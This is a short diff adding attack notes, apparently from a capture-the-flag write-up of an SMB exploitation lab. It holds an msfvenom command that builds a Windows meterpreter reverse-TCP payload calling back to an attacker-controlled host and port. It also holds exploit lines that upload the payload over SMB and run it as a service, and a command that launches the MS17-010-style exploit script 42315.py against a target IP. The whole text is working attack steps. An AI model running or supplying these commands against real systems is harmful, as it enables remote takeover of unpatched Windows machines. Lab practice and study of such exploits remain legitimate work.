@@ -1,0 +1,8 @@
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.38 lport=4444 -f exe > writeup.exe
+
+
+smb_send_file(smbConn, '/home/kali/Desktop/blue/writeup.exe', 'C', '/writeup.exe')
+service_exec(conn, r'cmd /c c:\\writeup.exe')
+
+
+./42315.py 10.129.154.159 ntsvcs
